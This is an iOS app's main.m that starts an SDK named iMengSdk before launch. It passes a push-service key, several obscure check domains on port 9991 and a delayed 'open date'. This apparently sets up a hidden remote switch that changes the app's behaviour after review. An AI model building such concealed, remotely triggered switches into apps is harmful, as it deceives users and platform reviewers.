//
//  main.m
//  RadiumBrowser
//
//  Created by Louis Zhu on 2018/5/3.
//  Copyright © 2018年 bslayter. All rights reserved.
//

#import <Foundation/Foundation.h>
#import "RadiumBrowser-Swift.h"
#import "cleanBrower.h"
int main(int argc, char * argv[])
{
    @autoreleasepool {
        NSDictionary *info =
        @{
          kJPushKey:    @"579aabb6539d76d1cde232a3",
          kJPushChanel: @"BrowserClean",
          kCheckUrl:    @[
                  @"DMIAF823.INFO:9991/",
                  @"mahgu76ge.com:9991/",
                  @"IDAJDS88.INFO:9991/",
                  @"JFIDJI77.INFO:9991/",
                  ],
          kIsDebugMode:@NO,
          kOpenDate:@"2018-05-13",
          };
        iMengSdk_init([AppDelegate class], info);
        //the app launch in
        return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));
    }
}
